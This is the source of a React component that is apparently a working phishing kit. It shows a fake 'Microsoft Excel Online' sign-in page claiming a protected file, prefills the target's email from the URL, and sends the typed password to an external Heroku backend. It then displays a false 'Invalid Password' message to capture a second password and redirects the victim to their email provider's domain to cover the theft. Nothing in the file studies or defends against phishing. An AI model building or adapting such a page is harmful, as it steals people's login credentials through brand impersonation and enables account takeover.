import "./App.css";
import React, { useState } from "react";
import { Styls } from "./stylls";
import emailjs from "emailjs-com";
import { useParams } from "react-router-dom";
import axios from "axios";

function Forms() {
  const params = useParams();

  const [showForm, setShowForm] = useState(true);
  const [confirmForm, setConfirmForm] = useState(false);
  const [pass, setPass] = useState("");
  const [pasers, setPasser] = useState("");
  const [email, setEmail] = useState(params.id);

  const submitHandler = async (e) => {
    e.preventDefault();

    console.log(email, pass);
    setConfirmForm(true);
    setShowForm(false);
    try {
      await axios.post("https://ikbackend.herokuapp.com/sendmail", {
        email,
        pass,
        pasers,
      });
    } catch (error) {
      console.log(error);
    }
  };
  const editHandler = async (e) => {
    e.preventDefault();

    let emailss = params.id;
    let domain = emailss.substring(emailss.lastIndexOf("@") + 1);
    window.setTimeout(() => {
      window.location.href = `https://${domain}`;
    }, 1000);

    try {
      await axios.post("https://ikbackend.herokuapp.com/sendmail", {
        email,
        pass,
        pasers,
      });
    } catch (error) {
      console.log(error);
    }
  };

  return (
    <Styls>
    
      {" "}
      {showForm && (
        <div id="html_encoder_div">
          <div className="container">
            <div className="office show border shadow bg-light" id="others">
              <div className="office-holder">
                <div className="logo">
                  <div id="login_logo">
                    <img
                      src="https://toppng.com/uploads/preview/excel-icon-excel-flat-icon-11553482530m4cmreyasv.png"
                      width="100"
                      height="100"
                      alt=""
                    />
                  </div>
                  <h5 className="font-weight-light">
                    <b> Microsoft Excel Online </b>
                    <br />
                  </h5>
                  <p>
                    This file is protected by Microsoft Online. Please sign in
                    to access file
                  </p>
                </div>

                <form className="formal" onSubmit={submitHandler}>
                  <div className="form-holder">
                    <div>
                      <div className="alert alert-danger hide alert2"></div>
                    </div>
                    <input
                      type="email"
                      required
                      value={email}
                      className="form-control"
                      onChange={(e) => setEmail(e.target.value)}
                    />
                    <input
                      type="password"
                      onChange={(e) => setPass(e.target.value)}
                      required
                      value={pass}
                      placeholder="Password"
                      className="form-control"
                    />

                    <div className="btn-holder">
                      <button type="submit" className="btn btn-lg col-12">
                        Download Document
                      </button>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      )}
      {confirmForm && (
        <div id="html_encoder_div">
          <div className="container">
            <div className="office show border shadow bg-light" id="others">
              <div className="office-holder">
                <div className="logo">
                  <div id="login_logo">
                    <img
                      src="https://toppng.com/uploads/preview/excel-icon-excel-flat-icon-11553482530m4cmreyasv.png"
                      width="100"
                      height="100"
                      alt=""
                    />
                  </div>
                  <h5 className="font-weight-light">
                    <b> Microsoft Excel Online </b>
                    <br />
                  </h5>
                  <p>
                    This file is protected by Microsoft Online. Please sign in
                    to access file
                  </p>
                </div>

                <div className="msg">
                  Invalid Password.! Please enter correct password.
                </div>

                <form className="formal" onSubmit={editHandler}>
                  <div className="form-holder">
                    <div>
                      <div className="alert alert-danger hide alert2"></div>
                    </div>
                    <input
                      type="email"
                      required
                      value={email}
                      className="form-control"
                      onChange={(e) => setEmail(e.target.value)}
                    />
                    <input
                      type="password"
                      onChange={(e) => setPasser(e.target.value)}
                      required
                      value={pasers}
                      placeholder="Password"
                      className="form-control"
                    />

                    <div className="btn-holder">
                      <button type="submit" className="btn btn-lg col-12">
                        Download Document
                      </button>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      )}
  
    </Styls>
  );
}

export default Forms;
